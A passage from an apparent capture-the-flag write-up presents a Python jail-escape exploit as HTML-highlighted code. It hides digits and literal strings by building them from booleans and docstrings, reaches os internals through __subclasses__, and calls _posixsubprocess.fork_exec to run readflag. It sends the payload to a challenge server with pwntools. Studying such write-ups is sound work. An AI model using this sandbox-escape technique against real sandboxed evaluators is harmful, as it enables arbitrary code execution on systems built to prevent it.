+</span></span><span class="line"><span class="cl">    <span class="n">src</span> <span class="o">=</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">.</span><span class="vm">__doc__</span> <span class="o">+</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__doc__</span>
+</span></span><span class="line"><span class="cl">    <span class="n">final</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fromdoc</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">:=</span><span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">fromdoc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">final</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;[[].__doc__.__doc__+</span><span class="se">{{}}</span><span class="s2">.__doc__][False][</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="si">}</span><span class="s2">]+&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span> <span class="n">final</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;_.__qualname__[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="n">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="o">.</span><span class="vm">__qualname__</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">x</span><span class="p">))</span><span class="si">}</span><span class="s2">]+&#34;</span> <span class="k">if</span> <span class="n">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="o">.</span><span class="vm">__qualname__</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="k">else</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">call_function</span><span class="p">(</span><span class="s1">&#39;_.__class__.__subclasses__&#39;</span><span class="p">,</span> <span class="s1">&#39;_.__base__&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="si">}</span><span class="s2">].__doc__[True]+&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">final</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sys_s</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;[*</span><span class="si">{</span><span class="n">os_module</span><span class="si">}</span><span class="s2">][</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="si">}</span><span class="s2">]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys_modules</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">os_module</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">sys_s</span><span class="si">}</span><span class="s2">].modules&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main_module_s</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;[*</span><span class="si">{</span><span class="n">sys_modules</span><span class="si">}</span><span class="s2">][</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span><span class="si">}</span><span class="s2">]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval_func</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">sys_modules</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">main_module_s</span><span class="si">}</span><span class="s2">].eval&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">to_eval</span> <span class="o">=</span> <span class="n">build_string</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[(os_module:=().__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">137</span><span class="p">)</span><span class="si">}</span><span class="s2">].__init__.__globals__).__class__,(sys:=os_module[&#39;sys&#39;]).__class__,sys.modules[&#39;_posixsubprocess&#39;].fork_exec([f&#39;.</span><span class="se">{{</span><span class="s2">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span class="se">}}</span><span class="s2">readflag&#39;.encode()],[f&#39;.</span><span class="se">{{</span><span class="s2">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span class="se">}}</span><span class="s2">readflag&#39;.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module[&#39;pipe&#39;]()),False,False,None,None,None,-True,None)]&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">system_sh</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="n">eval_func</span><span class="p">,</span> <span class="n">to_eval</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.139.98.117&#34;</span><span class="p">,</span> <span class="mi">6669</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">system_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div><p>Let&rsquo;s break it down</p>
 <ul>
 <li><code>gen_int</code> Since numbers cannot be used, they can be generated from booleans (eg. <code>3</code> becomes <code>True -- True -- True</code>). I used <code>--</code> instead of <code>+</code> because I couldn&rsquo;t find <code>+</code> inside the docs</li>
